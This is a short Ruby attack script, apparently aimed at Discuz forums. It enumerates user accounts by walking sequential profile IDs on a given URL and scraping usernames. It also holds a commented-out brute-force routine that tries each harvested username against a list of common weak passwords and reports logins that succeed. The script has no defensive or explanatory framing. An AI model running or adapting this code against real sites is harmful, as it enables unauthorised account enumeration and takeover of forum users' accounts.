#!/usr/bin/env ruby

$root_path = File.expand_path(File.dirname(__FILE__))
require 'open-uri'

class String
  def string_between_markers marker1, marker2
    self[/#{Regexp.escape(marker1)}(.*?)#{Regexp.escape(marker2)}/m, 1]
  end
end

def dz_dump_user(dz_path)
  id=1
  error_cnt = 0
  while true
    html = open(dz_path+'?'+id.to_s).read
    #puts html
    name = html.string_between_markers('<h2 class="mt">', '</h2>')
    if name
      puts name.strip!
      error_cnt = 0
    else
      error_cnt += 1
      return if error_cnt>10
    end

    id+=1
  end
end

=begin
def crack_password(dz_path, login_url, users)
  $passwords ||= %w|{{u}} 123456 a123456 123456a 5201314 111111 qq123456 123123 000000 woaini1314 1qaz2wsx 1q2w3e4r qwe123 123qwe a123123 123456aa|
  users.each_line{|u|
    u.strip!
    $passwords.each{|password|
      password.strip!
      password=u if password=='{{u}}'
      params = {}
      params["ReturnUrl"] = '/index.php?'
      params["username"] = u
      params["password"] = password
      params["submit"] = ''

      uri = URI.parse(login_url)
      res = Net::HTTP.post_form(uri, params)
      if res.body.include?('Password mistake.')
        print "#{params}                                                   \r"
      else
        puts "\n#{params} is ok!"
      end

    }
  }
end
=end

if ARGV[0]
  dz_dump_user ARGV[0]
else
  puts "#{$0} <url>"
end
